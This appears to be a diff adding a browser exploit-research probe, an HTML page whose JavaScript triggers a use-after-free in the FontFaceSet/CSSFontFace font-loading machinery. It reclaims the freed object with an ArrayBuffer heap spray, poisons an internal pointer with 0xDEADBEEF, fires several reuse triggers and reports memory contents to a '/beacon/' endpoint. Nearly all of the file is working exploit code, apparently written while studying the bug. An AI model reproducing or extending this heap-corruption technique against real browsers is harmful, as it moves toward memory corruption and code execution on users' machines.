@@ -1,0 +1,207 @@
+<!--
+  p589: Branch α/β discriminator — FontFaceSet.load() trigger after UAF
+
+  Tests cobrajet's pre-registered branch α (issue #181 supplement 8, §5):
+  After UAF + spray + continuation, poison +0x58=DEAD, seed +0x85=0xAA,
+  then trigger document.fonts.load() (FontFaceSet path, NOT FontFace IDL).
+
+  Outcomes:
+    α: +0x58 ≠ DEAD, +0x85 = 0x00 → re-stamp route proven (B+ alive)
+    β: +0x58 = DEAD, +0x85 = 0xAA → total gate, setter-walk arm closes
+
+  v7 tested gPa.load() / add() / style — those are FontFace IDL methods.
+  This probe tests document.fonts.load() — FontFaceSet C++ machinery that
+  cobrajet cites at FontFaceSet.cpp:101/:189/:206 as holding live Ref<CSSFontFace>
+  bypassing the JS wrapper gate.
+
+  Also tests:
+  - document.fonts.forEach (iterator path, :101)
+  - document.fonts.ready (ready promise)
+  - Re-add gPa + document.fonts.load("1em pa") (fresh matching path)
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p589</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+
+function main(){
+b('G');
+var gPa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(gPa);void gPa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++){
+  var buf=new ArrayBuffer(192);
+  var v=new Uint8Array(buf);
+  for(var k=0;k<192;k++)v[k]=0xAA;
+  v[0]=2;v[1]=0;v[2]=0;v[3]=0;
+  for(var k=0x58;k<0x70;k++)v[k]=0;
+  v[0x82]=0;
+  lane.push(v);
+}
+b('S'+lane.length);
+window._l=lane;
+window._gPa=gPa;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// ---- Phase 2: 60ms — capture hit lane ----
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i];
+    if(v[0]!==2||v[1]!==0||v[2]!==0||v[3]!==0){hi=i;break;}
+    for(var k=0x58;k<0x60;k++){if(v[k]!==0){hi=i;break;}}
+    if(hi>=0)break;
+  }
+  if(hi<0){b('AMISS');return;}
+  window._hi=hi;
+  var v=lane[hi];
+  b('HIT='+hi+',rc='+rD(v,0));
+  b('T='+rQ(v,0x58));
+  b('W='+rQ(v,0x68));
+  b('PRE85='+('0'+v[0x85].toString(16)).slice(-2));
+  b('PRE82='+v[0x82]);
+
+  // Check FontFaceSet state BEFORE poisoning
+  try{b('CHK_SA='+document.fonts.check('1em sa'));}catch(e){b('CHK_SA_ERR='+e.message);}
+  try{b('CHK_PA='+document.fonts.check('1em pa'));}catch(e){b('CHK_PA_ERR='+e.message);}
+  try{b('FSIZE='+document.fonts.size);}catch(e){b('FSIZE_ERR');}
+  var names=[];
+  try{document.fonts.forEach(function(f){names.push(f.family);});}catch(e){names.push('ERR:'+e.message);}
+  b('FACES='+names.join(','));
+},60);
+
+// ---- Phase 3: 200ms — poison +0x58, seed +0x85 ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  var v=lane[hi];
+
+  // Poison +0x58 = DEAD (unmapped VA)
+  v[0x58]=0xEF;v[0x59]=0xBE;v[0x5A]=0xAD;v[0x5B]=0xDE;
+  v[0x5C]=0xAD;v[0x5D]=0xDE;v[0x5E]=0xAD;v[0x5F]=0xDE;
+
+  // Seed +0x85 = 0xAA (m_mayBePurged oracle)
+  // If wrapper() runs again, it writes 0x00 here
+  v[0x85]=0xAA;
+
+  b('POISON_OK');
+  b('V58='+rQ(v,0x58));
+  b('V85='+('0'+v[0x85].toString(16)).slice(-2));
+},200);
+
+// ---- Phase 4: 400ms — Trigger A: document.fonts.load("1em sa") ----
+// The freed CSSFontFace was for family "sa" (from the CSS rule).
+// Does FontFaceSet still have an internal reference?
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  b('TRIG_A_SA');
+  try{
+    document.fonts.load('1em sa','B').then(
+      function(r){b('A_SA_OK='+r.length);},
+      function(e){b('A_SA_FAIL='+e.message);}
+    );
+  }catch(e){b('A_SA_ERR='+e.message);}
+},400);
+
+// ---- Phase 5: 600ms — read after trigger A ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  var v=lane[hi];
+  b('POST_A:58='+rQ(v,0x58)+',85='+('0'+v[0x85].toString(16)).slice(-2)+',rc='+rD(v,0));
+},600);
+
+// ---- Phase 6: 700ms — Trigger B: re-add gPa + document.fonts.load("1em pa") ----
+// gPa was deleted from set in trap. Re-add it, then trigger load via FontFaceSet.
+// gPa's own CSSFontFace is live — but does FontFaceSet::load() call wrapper()
+// on the freed face through matching/iteration?
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;var gPa=window._gPa;
+  if(!lane||hi===undefined||hi<0||!gPa)return;
+  b('TRIG_B_READD');
+  try{document.fonts.add(gPa);b('READD_OK');}catch(e){b('READD_ERR='+e.message);}
+  try{
+    document.fonts.load('1em pa','A').then(
+      function(r){b('B_PA_OK='+r.length);},
+      function(e){b('B_PA_FAIL='+e.message);}
+    );
+  }catch(e){b('B_PA_ERR='+e.message);}
+},700);
+
+// ---- Phase 7: 900ms — read after trigger B ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  var v=lane[hi];
+  b('POST_B:58='+rQ(v,0x58)+',85='+('0'+v[0x85].toString(16)).slice(-2)+',rc='+rD(v,0));
+},900);
+
+// ---- Phase 8: 1000ms — Trigger C: document.fonts.forEach (iterator path :101) ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  b('TRIG_C_ITER');
+  var count=0;
+  try{
+    document.fonts.forEach(function(face){
+      count++;
+      try{var s=face.status;b('ITER_'+count+'='+face.family+'/'+s);}catch(e){b('ITER_'+count+'_ERR');}
+    });
+    b('ITER_DONE='+count);
+  }catch(e){b('ITER_ERR='+e.message);}
+},1000);
+
+// ---- Phase 9: 1100ms — read after trigger C ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  var v=lane[hi];
+  b('POST_C:58='+rQ(v,0x58)+',85='+('0'+v[0x85].toString(16)).slice(-2)+',rc='+rD(v,0));
+},1100);
+
+// ---- Phase 10: 1200ms — Trigger D: document.fonts.ready ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  b('TRIG_D_READY');
+  try{
+    document.fonts.ready.then(function(){b('READY_OK');},function(){b('READY_FAIL');});
+  }catch(e){b('READY_ERR='+e.message);}
+},1200);
+
+// ---- Phase 11: 1400ms — final read ----
+setTimeout(function(){
+  var lane=window._l;var hi=window._hi;
+  if(!lane||hi===undefined||hi<0)return;
+  var v=lane[hi];
+  b('FINAL:58='+rQ(v,0x58)+',85='+('0'+v[0x85].toString(16)).slice(-2)+',82='+v[0x82]+',rc='+rD(v,0));
+
+  // Verdict
+  var dead=(v[0x58]===0xEF&&v[0x59]===0xBE&&v[0x5A]===0xAD&&v[0x5B]===0xDE);
+  var purged=(v[0x85]===0xAA);
+  if(!dead&&!purged)b('VERDICT=ALPHA_RESTAMP');
+  else if(dead&&purged)b('VERDICT=BETA_GATE');
+  else if(!dead&&purged)b('VERDICT=RESTAMP_NO_PURGE');
+  else b('VERDICT=GATE_BUT_PURGE');
+},1400);
+
+setTimeout(function(){b('ALIVE');},2000);
+setTimeout(function(){b('ALIVE2');},4000);
+}
+setTimeout(main,0);
+</script></head><body>p589</body></html>
